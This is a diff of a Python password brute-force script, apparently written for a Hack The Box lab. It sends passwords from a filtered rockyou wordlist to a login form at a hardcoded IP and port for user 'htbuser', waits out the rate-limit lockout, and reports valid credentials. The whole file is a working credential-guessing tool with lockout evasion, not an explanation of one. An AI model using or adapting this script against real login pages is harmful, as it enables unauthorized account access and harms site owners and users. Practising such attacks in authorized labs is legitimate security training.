@@ -1,49 +1,62 @@
-import requests
 import time
+import requests
 
-# file that contain user:pass
-passfile = "sort4.txt"
+# file that contains passwords
+# grep '[[:upper:]]' rockyou-50.txt | grep '[[:digit:]]' > testing.txt
+PASSFILE = "testing.txt"
 
 # create url using user and password as argument
-url = "http://94.237.49.182:50469/"
+URL = "http://83.136.253.251:43964/"
 
-# rate limit blocks for 30 seconds
-lock_time = 40
+# rate limit blocks for 40 seconds
+LOCK_TIME = 40
 
 # message that alert us we hit rate limit
-lock_message = "Too many login"
+LOCK_MESSAGE = "Too many login"
 
 # read user and password
-with open(passfile, "r") as fh:
-    for fline in fh:
+with open(PASSFILE, "r", encoding="utf-8") as passfile:
+    for line in passfile:
         # skip comment
-        if fline.startswith("#"):
+        if line.startswith("# "):
             continue
 
         # take password, join to keep password that contain a :
-        password = fline
+        password = line.strip("\n")
 
         # prepare POST data
         data = {
-            "userid": "htbuser",
-            "rpasswd": password,
-            "submit": "submit"
+            'userid': 'htbuser',
+            'passwd': password,
+            'submit': 'submit'
+        }
+
+        headers = {
+            'Content-Type' : 'application/x-www-form-urlencoded',
+            'Referer' : 'http://83.136.253.251:43964/'
         }
 
         # do the request
-        res = requests.post(url, data=data)
+        res = requests.post(URL, data=data, headers=headers)
+        # Print request information
+        print("Sending request:")
+        print("URL:", URL)
+        print("Headers:", headers)
+        print("Data:", data)
+        print(res.text)
 
+        # print(res._content)
         # handle generic credential error
         if "Invalid credentials" in res.text:
-            print(f"[-] Invalid credentials: userid:{"htbuser"} passwd:{password}")
+            print(f"[-] Invalid credentials: userid:htbuser passwd:{password}")
         # hit rate limit, let's say we have to wait 30 seconds
-        elif lock_message in res.text:
-            with open("skip.txt", "a") as file:
-                file.write(password)
-            print(f"[-] Hit rate limit in {password}[!] sleeping {lock_time}\n")
+        elif LOCK_MESSAGE in res.text:
+            # with open("skip2.txt", "a") as file:
+            #     file.write(password)
+            print(f"[-] Hit rate limit in {password}[!] sleeping {LOCK_TIME}\n")
             # do the actual sleep plus 0.5 to be sure
-            time.sleep(lock_time+0.5)
+            time.sleep(LOCK_TIME+0.5)
         # user and password were valid !
         else:
-            print(f"[+] Valid credentials: userid:{"htbuser"} passwd:{password} [+]")   
+            print(f"[+] Valid credentials: userid:htbuser passwd:{password} [+]")
             break
